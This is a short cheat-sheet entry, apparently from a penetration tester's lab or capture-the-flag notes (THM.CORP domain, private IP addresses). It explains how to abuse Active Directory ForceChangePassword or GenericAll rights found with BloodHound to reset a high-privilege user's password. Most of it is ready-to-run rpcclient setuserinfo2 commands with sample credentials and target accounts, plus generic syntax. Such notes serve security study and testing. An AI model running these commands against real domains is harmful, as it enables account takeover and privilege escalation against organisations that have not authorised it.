## ForceChangePassword

---

## Syntax

When in BloodHound ForceChangePassword or GenericAll is set,
we can abuse this command to change the password of an high priv user.

#### Command Execution

```
rpcclient -U 'THM.CORP\TABATHA_BRITT%marlboro(1985)' 10.10.82.118 \
-c 'setuserinfo2 SHAWNA_BRAY 23 "newpassword123!"'
```

#### In CLI

```
rpcclient -N  192.168.208.40 -U 'hazel.green%haze1988'
$> setuserinfo2 MOLLY.SMITH 23 'Password123!'
```

#### Syntax

```
rpcclient -N <ip> -U '<user>%<password>'
```
